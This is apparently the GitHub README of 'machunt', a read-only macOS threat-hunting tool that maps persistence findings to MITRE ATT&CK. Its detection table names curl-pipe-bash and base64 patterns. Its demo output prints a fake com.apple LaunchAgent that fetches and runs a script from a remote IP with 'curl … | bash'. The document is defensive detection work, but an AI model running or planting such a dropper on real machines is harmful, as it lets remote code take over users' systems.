<h1 align="center">🍏 machunt</h1>
<p align="center"><b>A macOS-native threat hunter.</b> Audits where Mac malware actually hides - mapped to MITRE ATT&amp;CK. Read-only.</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.9%2B-blue?logo=python&logoColor=white">
  <img src="https://img.shields.io/badge/platform-macOS-000000?logo=apple">
  <img src="https://img.shields.io/badge/framework-MITRE%20ATT%26CK-d7263d">
  <img src="https://img.shields.io/badge/license-MIT-green">
</p>

---

The security world is obsessed with Windows and Linux - **macOS gets ignored**, even as Mac malware (persistence via LaunchAgents, fake `com.apple.*` daemons, shell-profile hooks) keeps growing. `machunt` hunts those techniques right on the Mac it runs on, scores what it finds, and maps every hit to a **MITRE ATT&CK** technique. It never modifies anything.

## What it hunts

| area | ATT&CK | catches |
|------|--------|---------|
| LaunchAgents / LaunchDaemons | T1543.001 / .004 | `curl … \| bash`, base64 payloads, **`com.apple.*` masquerading** binaries |
| Shell start-up files | T1546.004 | malicious lines in `.zshrc` / `.bash_profile` |
| Cron | T1053.003 | suspicious scheduled jobs |
| Login items | T1547.015 | what auto-runs at login |
| Running processes | T1059 | binaries executing from `/tmp`, `/Users/Shared` |

## Demo

```text
$ machunt hunt --demo-only

╭─ machunt · macOS threat hunt   high 1  medium 0  info 2   3 findings ─╮
 sev    MITRE ATT&CK          finding                         detail
 HIGH   T1543.001 Launch Agent persistence: com.apple.        /bin/bash -c curl -fsSL
                               softwareupdated.helper          http://193.0.0.7/x.sh | bash
                                                               → downloads & pipes to a shell
 INFO   T1543.001 Launch Agent persistence: com.docker.helper auto-runs & restarts: /Applications/Docker.app/…
 INFO   T1543.001 Launch Agent persistence: com.spotify.web…  auto-runs & restarts: /Applications/Spotify.app/…
[!] high-severity persistence found. Investigate the paths above.
```

It pinpoints the fake `com.apple.softwareupdated.helper` (a curl-pipe-bash dropper masquerading as Apple) while leaving legitimate auto-run agents like Docker and Spotify as low-noise `info`.

## Install & run

```bash
git clone https://github.com/Halting24/machunt && cd machunt
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt          # just 'rich'

machunt hunt            # audit this Mac (read-only)
machunt hunt --demo     # also scan the bundled threat fixture
machunt hunt --demo-only  # scan ONLY the fixture (safe, isolated)
machunt hunt --json     # pipe into a SIEM / jq
```

The repo ships a safe `demo/` fixture (a planted malicious LaunchAgent plus benign Docker and Spotify agents) so you can see detection without real malware. Pass `--demo-only` to scan just the fixture.

## Why it stands out

A defensive tool for the platform **everyone else skips**, grounded in the same MITRE ATT&CK framework SOC teams report against, and it runs natively on the Mac mini in your pocket, not a Linux VM.

---
<p align="center"><i>Part of a cybersecurity project series · <a href="https://github.com/Halting24">@Halting24</a></i></p>
